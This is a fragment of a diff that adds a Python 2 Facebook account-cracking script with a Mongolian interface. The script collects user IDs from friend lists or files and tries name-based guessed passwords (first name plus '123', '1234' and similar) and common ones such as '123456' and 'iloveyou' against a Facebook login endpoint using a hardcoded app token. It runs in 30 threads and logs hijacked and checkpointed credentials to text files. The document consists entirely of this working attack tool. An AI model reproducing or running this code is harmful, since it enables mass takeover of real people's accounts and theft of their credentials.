+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/bangla.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+					print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos1
+					cek = open("done/bangla.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].lower()+'1234'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/bangla.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+							print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos2
+							cek = open("done/bangla.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['first_name'].lower()+'12345'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/bangla.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+									print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos3
+									cek = open("done/bangla.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = ('123456')
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/bangla.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+									else:
+										if 'www.facebook.com' in ko['error_msg']:
+											print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+											print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos4
+											cek = open("done/bangla.txt", "a")
+											cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+											cek.close()
+											cekpoint.append(zowe)
+										else:
+											bos5 = ('mongol')
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											ko = json.load(data)
+											if 'access_token' in ko:
+												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos5
+												oke = open("done/bangla.txt", "a")
+												oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+												oke.close()
+												oks.append(zowe)
+											else:
+												if 'www.facebook.com' in ko['error_msg']:
+													print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+													print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos5
+													cek = open("done/bangla.txt", "a")
+													cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos5+"\n")
+													cek.close()
+													cekpoint.append(zowe)
+												else:
+													bos6 = j['first_name'].lower()+'1122'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													ko = json.load(data)
+													if 'access_token' in ko:
+														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos6
+														oke = open("done/bangla.txt", "a")
+														oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+														oke.close()
+														oks.append(zowe)
+													else:
+														if 'www.facebook.com' in ko['error_msg']:
+															print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+															print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos6
+															cek = open("done/bangla.txt", "a")
+															cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos6+"\n")
+															cek.close()
+															cekpoint.append(zowe)
+														else:
+															bos7 = j['last_name'].lower()+'123'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															ko = json.load(data)
+															if 'access_token' in ko:
+																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos7
+																oke = open("done/bangla.txt", "a")
+																oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos7+"\n")
+																oke.close()
+																oks.append(zowe)
+															else:
+																if 'www.facebook.com' in ko['error_msg']:
+																	print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+																	print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos7
+																	cek = open("done/bangla.txt", "a")
+																	cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos7+"\n")
+																	cek.close()
+																	cekpoint.append(zowe)
+																else:
+																	bos8 = j['last_name'].lower()+'1234'
+																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																	ko = json.load(data)
+																	if 'access_token' in ko:
+																		print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+																		print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos8
+																		oke = open("done/bangla.txt", "a")
+																		oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos8+"\n")
+																		oke.close()
+																		oks.append(zowe)
+																	else:
+																		if 'www.facebook.com' in ko['error_msg']:
+																			print ("\n\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} \x1b[1;96mЦООЖТОЙ")
+																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;96m") + j['name']
+																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;96m") + zowe
+																			print ("\x1b[1;97m{\x1b[1;96m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;96m") + bos8
+																			cek = open("done/bangla.txt", "a")
+																			cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos8+"\n")
+																			cek.close()
+																			cekpoint.append(zowe)
+																			
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mНийт \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mФайл Хадгалсан \033[1;91m: \033[1;92mdone/bangla.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;96mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### Usa улсаас#####
+def crack_usa():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;95m01\033[1;97m} Өөрийн Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;95m02\033[1;97m} Нийтэд ил Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;95m03\033[1;97m} Файлаас"
+	print "\033[1;97m{\033[1;91m00\033[1;97m} Буцах"
+	print 50* "\033[1;94m─"
+	pilih_usa()
+
+#### PILIH USA ####
+def pilih_usa():
+	teak = raw_input("\033[1;95mKira \033[91m:\033[1;92m ")
+	if teak =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_usa()
+	elif teak =="1" or teak =="01":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("                \033[1;95m●●● \033[1;97mUsa улсаас\033[1;95m●●●")
+		print 50* "\033[1;94m─"
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif teak =="2" or teak =="02":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("                \033[1;95m●●● \033[1;97mUsa улсаас\033[1;95m●●●")
+		print 50* "\033[1;94m─"
+		idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНийтэд ил Найзын Жагсаалтаас \033[1;91m:\033[1;92m ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНэр \033[1;91m:\033[1;92m "+op["name"]
+		except KeyError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} ID  !"
+			raw_input("\n\033[1;95m[\033[1;97m<Буцах>\033[1;95m]")
+			crack_usa()
+		except requests.exceptions.ConnectionError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} Интернэт холболтоо шалгана уу !"
+			keluar()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif teak =="3" or teak =="03":
+		os.system('clear')
+		print logo
+		try:
+			print 50* "\033[1;94m─"
+			print ("                \033[1;95m●●● \033[1;97mUsa улсаас\033[1;95m●●●")
+			print 50* "\033[1;94m─"
+			idlist = raw_input('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНэр File\033[1;91m :\033[1;92m ')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга ! '
+			raw_input('\n\033[1;92m[ \033[1;97mБуцах \033[1;92m]')
+		except IOError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга !'
+			raw_input("\n\033[1;95m[\033[1;97m<Буцах>\033[1;95m]")
+			crack_usa()
+	elif teak =="0" or teak =="00":
+		menu()
+	else:
+		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Сонголт !"
+		pilih_usa()
+	
+	print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mНийт ID \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mЗогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mАжиллахгүй байвал Airplane mode асааж унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN USA #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].lower()+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/usa.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+					print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos1
+					cek = open("done/usa.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].lower()+'1234'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/usa.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+							print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos2
+							cek = open("done/usa.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['first_name'].lower()+'12345'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/usa.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+									print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos3
+									cek = open("done/usa.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = ('123456')
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/usa.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+									else:
+										if 'www.facebook.com' in ko['error_msg']:
+											print ("\n\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} \x1b[1;95mЦООЖТОЙ")
+											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;95m") + j['name']
+											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;95m") + zowe
+											print ("\x1b[1;97m{\x1b[1;95m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;95m") + bos4
+											cek = open("done/usa.txt", "a")
+											cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+											cek.close()
+											cekpoint.append(zowe)
+										else:
+											bos5 = ('iloveyou')
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											ko = json.load(data)
+											if 'access_token' in ko:
+												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m   > \x1b[1;92m") + zowe
+												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos5
+												oke = open("done/usa.txt", "a")
